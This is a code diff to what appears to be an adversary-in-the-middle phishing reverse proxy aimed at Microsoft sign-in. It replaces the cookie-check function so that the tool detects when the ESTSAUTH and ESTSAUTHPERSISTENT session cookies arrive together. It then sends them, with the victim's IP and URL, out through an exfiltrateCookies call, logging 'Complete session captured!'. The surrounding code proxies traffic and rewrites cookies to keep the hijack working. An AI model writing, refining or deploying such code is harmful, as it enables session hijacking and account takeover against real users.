@@ -353,11 +353,15 @@ function rewriteLocation(location, currentUpstream) {
 
 // ==================== AUTH DETECTION ====================
 
-function hasCriticalAuthCookies(cookieStr) {
-  if (!cookieStr) return false;
-  return CRITICAL_AUTH_COOKIES.every(name => 
-    cookieStr.toLowerCase().includes(name.toLowerCase())
-  );
+// FIXED: Check if ALL critical auth cookies are present in this specific response
+function hasCompleteAuthSession(cookieStr, cookies) {
+  if (!cookieStr || !cookies.length) return false;
+  
+  // Must have BOTH ESTSAUTH and ESTSAUTHPERSISTENT in the SAME response
+  const hasESTSAUTH = cookieStr.toLowerCase().includes('estsauth');
+  const hasESTSAUTHPERSISTENT = cookieStr.toLowerCase().includes('estsauthpersistent');
+  
+  return hasESTSAUTH && hasESTSAUTHPERSISTENT;
 }
 
 function hasAnyAuthCookies(cookieStr) {
@@ -573,33 +577,28 @@ export default async function handleRequest(request) {
     if (cookies?.length) {
       cookieStr = cookies.join('; ');
       
-      // CRITICAL: Only exfiltrate if CRITICAL auth cookies are present
-      // This ensures we only capture valid, complete sessions
-      const hasCritical = hasCriticalAuthCookies(cookieStr);
+      // FIXED: Only exfiltrate if BOTH critical cookies are in THIS response
+      const hasCompleteSession = hasCompleteAuthSession(cookieStr, cookies);
       const hasAnyAuth = hasAnyAuthCookies(cookieStr);
       
-      // Exfiltrate only when we have BOTH ESTSAUTH and ESTSAUTHPERSISTENT
-      // This prevents capturing incomplete/broken sessions
-      shouldExfiltrate = hasCritical;
+      // ONLY exfiltrate when we have a COMPLETE session (both ESTSAUTH and ESTSAUTHPERSISTENT together)
+      shouldExfiltrate = hasCompleteSession;
 
-      console.log(`[COOKIES] ${cookies.length} found, critical=${hasCritical}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
+      console.log(`[COOKIES] ${cookies.length} found, complete=${hasCompleteSession}, any=${hasAnyAuth}, exfil=${shouldExfiltrate}`);
       console.log(`[COOKIES] Names: ${cookies.map(c => c.split('=')[0]).join(', ')}`);
 
-      // Process cookies for browser - FIXED: Pass request hostname
+      // Process cookies for browser
       const modifiedCookies = processCookies(cookies, upstreamDomain, url.hostname);
       
-      // Only exfiltrate if we have critical auth cookies
+      // ONLY exfiltrate if we have a complete session (both cookies together)
       if (shouldExfiltrate) {
-        const detected = CRITICAL_AUTH_COOKIES.filter(n => 
-          cookieStr.toLowerCase().includes(n.toLowerCase())
-        );
-        console.log(`[EXFILTRATING] Critical cookies: ${detected.join(', ')}`);
+        console.log(`[EXFILTRATING] Complete session captured! Both ESTSAUTH and ESTSAUTHPERSISTENT present.`);
         await exfiltrateCookies(cookieStr, ip, info.type, url.href);
       } else if (hasAnyAuth) {
-        console.log(`[SKIP] Has auth cookies but missing critical ones - incomplete session`);
+        console.log(`[SKIP] Has auth cookies but not a complete session - waiting for full authentication`);
       }
 
-      // Create response headers - FIXED: Original cookies are now preserved in createResponseHeaders
+      // Create response headers
       const responseHeaders = createResponseHeaders(resp, { setCookies: modifiedCookies });
 
       // Process body
